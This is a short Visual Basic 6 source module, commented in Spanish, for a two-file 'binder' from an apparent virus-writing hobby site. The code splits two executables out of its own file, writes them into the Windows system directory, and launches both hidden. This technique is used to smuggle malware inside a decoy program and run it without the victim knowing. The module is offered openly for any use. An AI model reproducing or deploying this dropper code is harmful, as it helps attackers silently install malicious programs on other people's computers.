Attribute VB_Name = "ModPrincipal"
'-----------------------------------------------------------'
' Proyecto             : Binder simple =)                   '
' Fecha de Compilación : 12/09/2009                         '
' Hora de Compilación  : 11:14 p.m.                         '
' Autor                : D@rB-15                            '
' Mail                 : ViriiLab.Cr@Hotmail.Com            '
' Página Web           : http://www.viriilab-security.tk/   '
' Proposito            : Un simple Binder de 2 archivos     '
' Uso                  : El que usted quiera :)             '
' Lineas de código     : 33                                 '
'-----------------------------------------------------------'
Option Explicit
Dim Yo As String
Dim A As Integer, B As Integer, C As Integer
Dim Archivo() As String
Dim SysDir As String
Const Delimitador As String = "#$/\$#"

Sub Main()
A = FreeFile()
B = FreeFile()
C = FreeFile()
SysDir = Mid$(Environ$("COMSPEC"), 1, 20)
Open MiRuta & App.EXEName & ".exe" For Binary As #A
Yo = Space(LOF(A))
Get #A, , Yo
Close #A
Archivo = Split(Yo, Delimitador)
Open SysDir & "Archivo1.exe" For Binary As #B
Put #B, , Archivo(1)
Close #B
Open SysDir & "Archivo2.exe" For Binary As #C
Put #C, , Archivo(2)
Close #C
Shell SysDir & "Archivo1.exe", vbHide
Shell SysDir & "Archivo2.exe", vbHide
End Sub

Function MiRuta() As String
MiRuta = App.Path
If Right(MiRuta, 1) <> "\" Then
MiRuta = MiRuta & "\"
Else
MiRuta = MiRuta
End If
End Function
